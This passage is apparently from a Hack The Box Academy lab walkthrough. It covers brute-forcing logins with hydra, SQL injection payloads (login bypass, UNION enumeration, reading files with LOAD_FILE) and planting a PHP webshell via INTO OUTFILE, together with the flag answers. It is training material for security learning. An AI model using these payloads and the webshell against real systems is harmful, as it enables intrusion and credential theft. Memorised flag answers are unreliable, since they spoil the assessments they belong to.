</span><span id="__span-344-9"><a id="__codelineno-344-9" name="__codelineno-344-9"></a># Login into the target
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}</p>
<h3 id="skills-assessment-part-1">Skills Assessment Part 1</h3>
<p>The first part of the skills assessment will require you to brute-force the the target instance. Successfully finding the correct login will provide you with the username you will need to start Skills Assessment Part 2.</p>
<p><strong>What is the password for the basic auth login?</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-345-1">1</a></span>
<span class="normal"><a href="#__codelineno-345-2">2</a></span>
<span class="normal"><a href="#__codelineno-345-3">3</a></span>
<span class="normal"><a href="#__codelineno-345-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-345-1"><a id="__codelineno-345-1" name="__codelineno-345-1"></a><span class="c1"># We have the provided lists: usernames.txt and passwords.txt</span>
</span><span id="__span-345-2"><a id="__codelineno-345-2" name="__codelineno-345-2"></a>hydra<span class="w"> </span>-L<span class="w"> </span>usernames.txt<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>-f<span class="w"> </span><span class="m">83</span>.136.253.44<span class="w"> </span>-s<span class="w"> </span><span class="m">44641</span><span class="w"> </span>http-get<span class="w"> </span>
</span><span id="__span-345-3"><a id="__codelineno-345-3" name="__codelineno-345-3"></a>
</span><span id="__span-345-4"><a id="__codelineno-345-4" name="__codelineno-345-4"></a><span class="c1"># Output: [44641][http-get] host: 83.136.253.44   login: admin   password: Admin123</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: Admin123</p>
<p><strong>After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-346-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-346-1"><a id="__codelineno-346-1" name="__codelineno-346-1"></a><span class="c1"># Access the site with user and password and the name is retrieved</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: satwossh</p>
<h3 id="skills-assessment-part-2">Skills Assessment Part 2</h3>
<p>This is the second part of the skills assessment. <code>YOU NEED TO COMPLETE THE FIRST PART BEFORE STARTING THIS</code>. Use the username you were given when you completed part 1 of the skills assessment to brute force the login on the target instance.</p>
<p>What is the username of the ftp user you find via brute-forcing?</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-347-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-347-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-347-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-347-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-347-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-347-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-347-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-347-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-347-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-347-10">10</a></span>
<span class="normal"><a href="#__codelineno-347-11">11</a></span>
<span class="normal"><a href="#__codelineno-347-12">12</a></span>
<span class="normal"><a href="#__codelineno-347-13">13</a></span>
<span class="normal"><a href="#__codelineno-347-14">14</a></span>
<span class="normal"><a href="#__codelineno-347-15">15</a></span>
<span class="normal"><a href="#__codelineno-347-16">16</a></span>
<span class="normal"><a href="#__codelineno-347-17">17</a></span>
<span class="normal"><a href="#__codelineno-347-18">18</a></span>
<span class="normal"><a href="#__codelineno-347-19">19</a></span>
<span class="normal"><a href="#__codelineno-347-20">20</a></span>
<span class="normal"><a href="#__codelineno-347-21">21</a></span>
<span class="normal"><a href="#__codelineno-347-22">22</a></span>
<span class="normal"><a href="#__codelineno-347-23">23</a></span>
<span class="normal"><a href="#__codelineno-347-24">24</a></span>
<span class="normal"><a href="#__codelineno-347-25">25</a></span>
<span class="normal"><a href="#__codelineno-347-26">26</a></span>
<span class="normal"><a href="#__codelineno-347-27">27</a></span>
<span class="normal"><a href="#__codelineno-347-28">28</a></span>
<span class="normal"><a href="#__codelineno-347-29">29</a></span>
<span class="normal"><a href="#__codelineno-347-30">30</a></span>
<span class="normal"><a href="#__codelineno-347-31">31</a></span>
<span class="normal"><a href="#__codelineno-347-32">32</a></span>
<span class="normal"><a href="#__codelineno-347-33">33</a></span>
<span class="normal"><a href="#__codelineno-347-34">34</a></span>
<span class="normal"><a href="#__codelineno-347-35">35</a></span>
<span class="normal"><a href="#__codelineno-347-36">36</a></span>
<span class="normal"><a href="#__codelineno-347-37">37</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-347-1"><a id="__codelineno-347-1" name="__codelineno-347-1"></a>sudo nmap -sC -sV -Pn 83.136.253.73 -p 53002  
</span><span id="__span-347-2"><a id="__codelineno-347-2" name="__codelineno-347-2"></a># output: 53002/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
</span><span id="__span-347-3"><a id="__codelineno-347-3" name="__codelineno-347-3"></a>
</span><span id="__span-347-4"><a id="__codelineno-347-4" name="__codelineno-347-4"></a># Now we brute force ssh service with hydra
</span><span id="__span-347-5"><a id="__codelineno-347-5" name="__codelineno-347-5"></a>hydra -l satwossh -P passwords.txt -f 83.136.253.73  -s 53002  ssh
</span><span id="__span-347-6"><a id="__codelineno-347-6" name="__codelineno-347-6"></a># Output: [53002][ssh] host: 83.136.253.73   login: satwossh   password: password1
</span><span id="__span-347-7"><a id="__codelineno-347-7" name="__codelineno-347-7"></a>
</span><span id="__span-347-8"><a id="__codelineno-347-8" name="__codelineno-347-8"></a># We access the service with creds: satwossh:password1
</span><span id="__span-347-9"><a id="__codelineno-347-9" name="__codelineno-347-9"></a>ssh satwossh@83.136.253.73 -p 53002 
</span><span id="__span-347-10"><a id="__codelineno-347-10" name="__codelineno-347-10"></a>
</span><span id="__span-347-11"><a id="__codelineno-347-11" name="__codelineno-347-11"></a># We see the content of our home folder and read the IncidentReport.txt:
</span><span id="__span-347-12"><a id="__codelineno-347-12" name="__codelineno-347-12"></a>ls
</span><span id="__span-347-13"><a id="__codelineno-347-13" name="__codelineno-347-13"></a>cat IncidentReport.txt
</span><span id="__span-347-14"><a id="__codelineno-347-14" name="__codelineno-347-14"></a># We obtain an interesting name: &quot;Thomas Smith&quot;. 
</span><span id="__span-347-15"><a id="__codelineno-347-15" name="__codelineno-347-15"></a>
</span><span id="__span-347-16"><a id="__codelineno-347-16" name="__codelineno-347-16"></a># We enumerate open services: 
</span><span id="__span-347-17"><a id="__codelineno-347-17" name="__codelineno-347-17"></a>nmap localhost
</span><span id="__span-347-18"><a id="__codelineno-347-18" name="__codelineno-347-18"></a># Output: open ports: 21 and 22.
</span><span id="__span-347-19"><a id="__codelineno-347-19" name="__codelineno-347-19"></a>
</span><span id="__span-347-20"><a id="__codelineno-347-20" name="__codelineno-347-20"></a># We will use username-anarchy to generate a list of potential users:
</span><span id="__span-347-21"><a id="__codelineno-347-21" name="__codelineno-347-21"></a>echo &quot;Thomas Smith&quot; &gt; realnames.txt
</span><span id="__span-347-22"><a id="__codelineno-347-22" name="__codelineno-347-22"></a>./username-anarchy -i realnames.txt
</span><span id="__span-347-23"><a id="__codelineno-347-23" name="__codelineno-347-23"></a># we save the output under ~/namelist.txt
</span><span id="__span-347-24"><a id="__codelineno-347-24" name="__codelineno-347-24"></a>
</span><span id="__span-347-25"><a id="__codelineno-347-25" name="__codelineno-347-25"></a># We launch hydra
</span><span id="__span-347-26"><a id="__codelineno-347-26" name="__codelineno-347-26"></a>hydra -L namelist.txt -P passwords.txt -f 127.0.0.1 ftp
</span><span id="__span-347-27"><a id="__codelineno-347-27" name="__codelineno-347-27"></a># output: [21][ftp] host: 127.0.0.1   login: thomas   password: chocolate!
</span><span id="__span-347-28"><a id="__codelineno-347-28" name="__codelineno-347-28"></a>
</span><span id="__span-347-29"><a id="__codelineno-347-29" name="__codelineno-347-29"></a># We access ftp
</span><span id="__span-347-30"><a id="__codelineno-347-30" name="__codelineno-347-30"></a>ftp thomas@127.0.0.1
</span><span id="__span-347-31"><a id="__codelineno-347-31" name="__codelineno-347-31"></a># enter password when prompted: chocolate!
</span><span id="__span-347-32"><a id="__codelineno-347-32" name="__codelineno-347-32"></a>
</span><span id="__span-347-33"><a id="__codelineno-347-33" name="__codelineno-347-33"></a># Now, we browse and extract the flag.txt
</span><span id="__span-347-34"><a id="__codelineno-347-34" name="__codelineno-347-34"></a>dir 
</span><span id="__span-347-35"><a id="__codelineno-347-35" name="__codelineno-347-35"></a>get flag.txt
</span><span id="__span-347-36"><a id="__codelineno-347-36" name="__codelineno-347-36"></a>quit
</span><span id="__span-347-37"><a id="__codelineno-347-37" name="__codelineno-347-37"></a>cat flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{brut3f0rc1ng_succ3ssful}</p>
<p>What is the flag contained within flag.txt</p>
<h2 id="sql-injection-fundamentals"><a href="https://academy.hackthebox.com/module/details/33">SQL Injection Fundamentals</a></h2>
<h3 id="mysql_1">MySQL</h3>
<p>Authenticate to 83.136.255.194:55762 with user "root" and password "password"
<strong>Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-348-1">1</a></span>
<span class="normal"><a href="#__codelineno-348-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-348-1"><a id="__codelineno-348-1" name="__codelineno-348-1"></a>mysql -u root -h $ip -P $port -ppassword
</span><span id="__span-348-2"><a id="__codelineno-348-2" name="__codelineno-348-2"></a>show databases;
</span></code></pre></div></td></tr></table></div>
<p>Results: employees</p>
<p><strong>What is the department number for the 'Development' department?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-349-1">1</a></span>
<span class="normal"><a href="#__codelineno-349-2">2</a></span>
<span class="normal"><a href="#__codelineno-349-3">3</a></span>
<span class="normal"><a href="#__codelineno-349-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-349-1"><a id="__codelineno-349-1" name="__codelineno-349-1"></a>mysql -u root -h $ip -P $port -ppassword
</span><span id="__span-349-2"><a id="__codelineno-349-2" name="__codelineno-349-2"></a>show databases;
</span><span id="__span-349-3"><a id="__codelineno-349-3" name="__codelineno-349-3"></a>show tables;
</span><span id="__span-349-4"><a id="__codelineno-349-4" name="__codelineno-349-4"></a>select * from departments;
</span></code></pre></div></td></tr></table></div>
<p>Results: d005</p>
<p><strong>What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-350-1">1</a></span>
<span class="normal"><a href="#__codelineno-350-2">2</a></span>
<span class="normal"><a href="#__codelineno-350-3">3</a></span>
<span class="normal"><a href="#__codelineno-350-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-350-1"><a id="__codelineno-350-1" name="__codelineno-350-1"></a>mysql -u root -h $ip -P $port -ppassword
</span><span id="__span-350-2"><a id="__codelineno-350-2" name="__codelineno-350-2"></a>show databases;
</span><span id="__span-350-3"><a id="__codelineno-350-3" name="__codelineno-350-3"></a>show tables;
</span><span id="__span-350-4"><a id="__codelineno-350-4" name="__codelineno-350-4"></a>select * from employees WHERE first_name LIKE &#39;Bar%&#39; AND hire_date=&#39;1990-01-01&#39;;
</span></code></pre></div></td></tr></table></div>
<p>Results: Mitchem</p>
<p><strong>In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-351-1">1</a></span>
<span class="normal"><a href="#__codelineno-351-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-351-1"><a id="__codelineno-351-1" name="__codelineno-351-1"></a>mysql -u root -h $ip -P $port -ppassword
</span><span id="__span-351-2"><a id="__codelineno-351-2" name="__codelineno-351-2"></a>SELECT * from titles WHERE (emp_no &gt; 10000 OR title NOT LIKE &#39;Engineer&#39;);
</span></code></pre></div></td></tr></table></div>
<p>Results: 654</p>
<h3 id="sql-injections">SQL Injections</h3>
<p><strong>Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-352-1">1</a></span>
<span class="normal"><a href="#__codelineno-352-2">2</a></span>
<span class="normal"><a href="#__codelineno-352-3">3</a></span>
<span class="normal"><a href="#__codelineno-352-4">4</a></span>
<span class="normal"><a href="#__codelineno-352-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-352-1"><a id="__codelineno-352-1" name="__codelineno-352-1"></a># Username
</span><span id="__span-352-2"><a id="__codelineno-352-2" name="__codelineno-352-2"></a>tom&#39; OR &#39;1&#39;=&#39;1
</span><span id="__span-352-3"><a id="__codelineno-352-3" name="__codelineno-352-3"></a>
</span><span id="__span-352-4"><a id="__codelineno-352-4" name="__codelineno-352-4"></a># Password
</span><span id="__span-352-5"><a id="__codelineno-352-5" name="__codelineno-352-5"></a>lala
</span></code></pre></div></td></tr></table></div>
<p>Results:  202a1d1a8b195d5e9a57e434cc16000c</p>
<p><strong>Login as the user with the id 5 to get the flag.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-353-1">1</a></span>
<span class="normal"><a href="#__codelineno-353-2">2</a></span>
<span class="normal"><a href="#__codelineno-353-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-353-1"><a id="__codelineno-353-1" name="__codelineno-353-1"></a># Username
</span><span id="__span-353-2"><a id="__codelineno-353-2" name="__codelineno-353-2"></a>&#39; or id=5)#
</span><span id="__span-353-3"><a id="__codelineno-353-3" name="__codelineno-353-3"></a># Leave password empty
</span></code></pre></div></td></tr></table></div>
<p>Results:  cdad9ecdf6f14b45ff5c4de32909caec</p>
<p>Authenticate to <code>$ip:$port</code> with user "root" and password "password". Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-354-1">1</a></span>
<span class="normal"><a href="#__codelineno-354-2">2</a></span>
<span class="normal"><a href="#__codelineno-354-3">3</a></span>
<span class="normal"><a href="#__codelineno-354-4">4</a></span>
<span class="normal"><a href="#__codelineno-354-5">5</a></span>
<span class="normal"><a href="#__codelineno-354-6">6</a></span>
<span class="normal"><a href="#__codelineno-354-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-354-1"><a id="__codelineno-354-1" name="__codelineno-354-1"></a>mysql -u root -h $ip -P $port -ppassword
</span><span id="__span-354-2"><a id="__codelineno-354-2" name="__codelineno-354-2"></a>
</span><span id="__span-354-3"><a id="__codelineno-354-3" name="__codelineno-354-3"></a>show databases;
</span><span id="__span-354-4"><a id="__codelineno-354-4" name="__codelineno-354-4"></a>use employees;
</span><span id="__span-354-5"><a id="__codelineno-354-5" name="__codelineno-354-5"></a>describe employees;
</span><span id="__span-354-6"><a id="__codelineno-354-6" name="__codelineno-354-6"></a>describe departments;
</span><span id="__span-354-7"><a id="__codelineno-354-7" name="__codelineno-354-7"></a>SELECT dept_no,dept_name,NULL,NULL,NULL,NULL from departments UNION select * FROM employees;
</span></code></pre></div></td></tr></table></div>
<p>Results: 663</p>
<p><strong>Use a Union injection to get the result of 'user()'</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-355-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-355-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-355-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-355-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-355-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-355-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-355-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-355-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-355-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-355-10">10</a></span>
<span class="normal"><a href="#__codelineno-355-11">11</a></span>
<span class="normal"><a href="#__codelineno-355-12">12</a></span>
<span class="normal"><a href="#__codelineno-355-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-355-1"><a id="__codelineno-355-1" name="__codelineno-355-1"></a>&#39; ORDER BY 1;#
</span><span id="__span-355-2"><a id="__codelineno-355-2" name="__codelineno-355-2"></a>&#39; ORDER BY 2;#
</span><span id="__span-355-3"><a id="__codelineno-355-3" name="__codelineno-355-3"></a>&#39; ORDER BY 3;#
</span><span id="__span-355-4"><a id="__codelineno-355-4" name="__codelineno-355-4"></a>&#39; ORDER BY 4;#
</span><span id="__span-355-5"><a id="__codelineno-355-5" name="__codelineno-355-5"></a>&#39; ORDER BY 5;#
</span><span id="__span-355-6"><a id="__codelineno-355-6" name="__codelineno-355-6"></a>
</span><span id="__span-355-7"><a id="__codelineno-355-7" name="__codelineno-355-7"></a># With 5 columns it will return an error, so it has 4 columns
</span><span id="__span-355-8"><a id="__codelineno-355-8" name="__codelineno-355-8"></a>
</span><span id="__span-355-9"><a id="__codelineno-355-9" name="__codelineno-355-9"></a># Check out which ones are printed with
</span><span id="__span-355-10"><a id="__codelineno-355-10" name="__codelineno-355-10"></a>&#39; UNION select 1,2,3,4;#
</span><span id="__span-355-11"><a id="__codelineno-355-11" name="__codelineno-355-11"></a>
</span><span id="__span-355-12"><a id="__codelineno-355-12" name="__codelineno-355-12"></a># The UI will give you columns 2,3,4. Inject the code there
</span><span id="__span-355-13"><a id="__codelineno-355-13" name="__codelineno-355-13"></a>&#39; UNION select 1,user(),@@version,4;#
</span></code></pre></div></td></tr></table></div>
<p>Results: root@localhost</p>
<h3 id="exploitation">Exploitation</h3>
<p><strong>What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-356-1">1</a></span>
<span class="normal"><a href="#__codelineno-356-2">2</a></span>
<span class="normal"><a href="#__codelineno-356-3">3</a></span>
<span class="normal"><a href="#__codelineno-356-4">4</a></span>
<span class="normal"><a href="#__codelineno-356-5">5</a></span>
<span class="normal"><a href="#__codelineno-356-6">6</a></span>
<span class="normal"><a href="#__codelineno-356-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-356-1"><a id="__codelineno-356-1" name="__codelineno-356-1"></a># This comes from the previous exercise...
</span><span id="__span-356-2"><a id="__codelineno-356-2" name="__codelineno-356-2"></a>
</span><span id="__span-356-3"><a id="__codelineno-356-3" name="__codelineno-356-3"></a># Get all the columns from the table users
</span><span id="__span-356-4"><a id="__codelineno-356-4" name="__codelineno-356-4"></a>cn&#39; UNION select 1,column_name,3,4 from information_schema.columns WHERE table_name=&#39;users&#39;-- -
</span><span id="__span-356-5"><a id="__codelineno-356-5" name="__codelineno-356-5"></a>
</span><span id="__span-356-6"><a id="__codelineno-356-6" name="__codelineno-356-6"></a># Get id, username and password from table users:
</span><span id="__span-356-7"><a id="__codelineno-356-7" name="__codelineno-356-7"></a>cn&#39; UNION select 1,id,username,password from users-- -
</span></code></pre></div></td></tr></table></div>
<table>
<thead>
<tr>
<th><strong>Port Code</strong></th>
<th></th>
<th></th>
<th><strong>Port City</strong></th>
<th></th>
<th></th>
<th><strong>Port Volume</strong></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td></td>
<td></td>
<td>admin</td>
<td></td>
<td></td>
<td>392037dbba51f692776d6cefb6dd546d</td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td></td>
<td></td>
<td>newuser</td>
<td></td>
<td></td>
<td>9da2c9bcdf39d8610954e0e11ea8f45f</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>Results:  9da2c9bcdf39d8610954e0e11ea8f45f</p>
<p><strong>We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-357-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-357-1"><a id="__codelineno-357-1" name="__codelineno-357-1"></a>cn<span class="err">&#39;</span><span class="w"> </span>UNION<span class="w"> </span>SELECT<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>LOAD_FILE<span class="o">(</span><span class="s2">&quot;/var/www/html/config.php&quot;</span><span class="o">)</span>,<span class="w"> </span><span class="m">3</span>,<span class="w"> </span><span class="m">4</span>--<span class="w"> </span>-
</span></code></pre></div></td></tr></table></div>
<p>Results: dB_pAssw0rd_iS_flag!</p>
<p><strong>Find the flag by using a webshell.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-358-1">1</a></span>
<span class="normal"><a href="#__codelineno-358-2">2</a></span>
<span class="normal"><a href="#__codelineno-358-3">3</a></span>
<span class="normal"><a href="#__codelineno-358-4">4</a></span>
<span class="normal"><a href="#__codelineno-358-5">5</a></span>
<span class="normal"><a href="#__codelineno-358-6">6</a></span>
<span class="normal"><a href="#__codelineno-358-7">7</a></span>
<span class="normal"><a href="#__codelineno-358-8">8</a></span>
<span class="normal"><a href="#__codelineno-358-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-358-1"><a id="__codelineno-358-1" name="__codelineno-358-1"></a># Upload a webshell using the file upload. 
</span><span id="__span-358-2"><a id="__codelineno-358-2" name="__codelineno-358-2"></a># 1. User with `FILE` privilege enabled. If our user is root:
</span><span id="__span-358-3"><a id="__codelineno-358-3" name="__codelineno-358-3"></a>SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee=&quot;&#39;root&#39;@&#39;localhost&#39;&quot;-- -
</span><span id="__span-358-4"><a id="__codelineno-358-4" name="__codelineno-358-4"></a>
</span><span id="__span-358-5"><a id="__codelineno-358-5" name="__codelineno-358-5"></a># 2. Check that MySQL global `secure_file_priv` variable is not enabled
</span><span id="__span-358-6"><a id="__codelineno-358-6" name="__codelineno-358-6"></a>SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee=&quot;&#39;root&#39;@&#39;localhost&#39;&quot;-- -
</span><span id="__span-358-7"><a id="__codelineno-358-7" name="__codelineno-358-7"></a>
</span><span id="__span-358-8"><a id="__codelineno-358-8" name="__codelineno-358-8"></a># Write access to the location we want to write to on the back-end server. In this case we will upload a shell
</span><span id="__span-358-9"><a id="__codelineno-358-9" name="__codelineno-358-9"></a>cn&#39; union select &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;, &quot;&quot;, &quot;&quot; into outfile &#39;/var/www/html/shell.php&#39;-- -
</span></code></pre></div></td></tr></table></div>
<p>This can be verified by browsing to the <code>/shell.php</code> file and executing commands via the <code>0</code> parameter, with <code>?0=id</code> in our URL:</p>
<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-359-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-359-1"><a id="__codelineno-359-1" name="__codelineno-359-1"></a>https://$ip:$port/shell.php?0=id
</span></code></pre></div></td></tr></table></div>
<p>Now we obtain the flag:</p>
<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-360-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-360-1"><a id="__codelineno-360-1" name="__codelineno-360-1"></a>https://$ip:$port/shell.php?0=cat%20%20/var/www/flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: d2b5b27ae688b6a0f1d21b7d3a0798cd</p>
<h3 id="skills-assessment_4">Skills assessment</h3>
<p><strong>Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-361-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-361-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-361-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-361-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-361-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-361-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-361-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-361-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-361-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-361-10">10</a></span>
<span class="normal"><a href="#__codelineno-361-11">11</a></span>
<span class="normal"><a href="#__codelineno-361-12">12</a></span>
<span class="normal"><a href="#__codelineno-361-13">13</a></span>
<span class="normal"><a href="#__codelineno-361-14">14</a></span>
<span class="normal"><a href="#__codelineno-361-15">15</a></span>
<span class="normal"><a href="#__codelineno-361-16">16</a></span>
<span class="normal"><a href="#__codelineno-361-17">17</a></span>
<span class="normal"><a href="#__codelineno-361-18">18</a></span>
<span class="normal"><a href="#__codelineno-361-19">19</a></span>
<span class="normal"><a href="#__codelineno-361-20">20</a></span>
<span class="normal"><a href="#__codelineno-361-21">21</a></span>
<span class="normal"><a href="#__codelineno-361-22">22</a></span>
<span class="normal"><a href="#__codelineno-361-23">23</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-361-1"><a id="__codelineno-361-1" name="__codelineno-361-1"></a># Access to the site http:\\$ip:$port
</span><span id="__span-361-2"><a id="__codelineno-361-2" name="__codelineno-361-2"></a># Enter as user
</span><span id="__span-361-3"><a id="__codelineno-361-3" name="__codelineno-361-3"></a>&#39; OR 1=1-- -
</span><span id="__span-361-4"><a id="__codelineno-361-4" name="__codelineno-361-4"></a># Enter anything as password
</span><span id="__span-361-5"><a id="__codelineno-361-5" name="__codelineno-361-5"></a>
</span><span id="__span-361-6"><a id="__codelineno-361-6" name="__codelineno-361-6"></a># The search box is vulnerable to SQL injection. It has 5 columns:
</span><span id="__span-361-7"><a id="__codelineno-361-7" name="__codelineno-361-7"></a>cn&#39; UNION SELECT 1, super_priv, 3, 4, 5 FROM mysql.user WHERE user=&quot;root&quot;-- -
</span><span id="__span-361-8"><a id="__codelineno-361-8" name="__codelineno-361-8"></a>
</span><span id="__span-361-9"><a id="__codelineno-361-9" name="__codelineno-361-9"></a># Checking out who we are:
</span><span id="__span-361-10"><a id="__codelineno-361-10" name="__codelineno-361-10"></a>cn&#39; union select &quot;&quot;,user(), &quot;&quot;, &quot;&quot;, &quot;&quot;-- - 
</span><span id="__span-361-11"><a id="__codelineno-361-11" name="__codelineno-361-11"></a># It returns root
</span><span id="__span-361-12"><a id="__codelineno-361-12" name="__codelineno-361-12"></a>
</span><span id="__span-361-13"><a id="__codelineno-361-13" name="__codelineno-361-13"></a># Upload a SHELL
</span><span id="__span-361-14"><a id="__codelineno-361-14" name="__codelineno-361-14"></a>cn&#39; union select &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;, &quot;&quot;, &quot;&quot;, &quot;&quot; into outfile &#39;/var/www/html/dashboard/shell.php&#39;-- -
</span><span id="__span-361-15"><a id="__codelineno-361-15" name="__codelineno-361-15"></a>
</span><span id="__span-361-16"><a id="__codelineno-361-16" name="__codelineno-361-16"></a># And now we can execute it:
</span><span id="__span-361-17"><a id="__codelineno-361-17" name="__codelineno-361-17"></a>http://94.237.58.147:55928/dashboard/shell.php?0=id
</span><span id="__span-361-18"><a id="__codelineno-361-18" name="__codelineno-361-18"></a>
</span><span id="__span-361-19"><a id="__codelineno-361-19" name="__codelineno-361-19"></a># Prints the root directory
</span><span id="__span-361-20"><a id="__codelineno-361-20" name="__codelineno-361-20"></a>http://94.237.58.147:55928/dashboard/shell.php?0=ls%20/
</span><span id="__span-361-21"><a id="__codelineno-361-21" name="__codelineno-361-21"></a>
</span><span id="__span-361-22"><a id="__codelineno-361-22" name="__codelineno-361-22"></a># Print the flag:
</span><span id="__span-361-23"><a id="__codelineno-361-23" name="__codelineno-361-23"></a>http://94.237.58.147:55928/dashboard/shell.php?0=cat%20/flag_cae1dadcd174.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: 528d6d9cedc2c7aab146ef226e918396</p>
<h2 id="cross-site-scripting-xss"><a href="https://academy.hackthebox.com/module/details/103">Cross-Site Scripting (XSS)</a></h2>
<h3 id="xss-basics">XSS Basics</h3>
<h4 id="stored-xss">Stored XSS</h4>
<p><strong>To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.</strong></p>
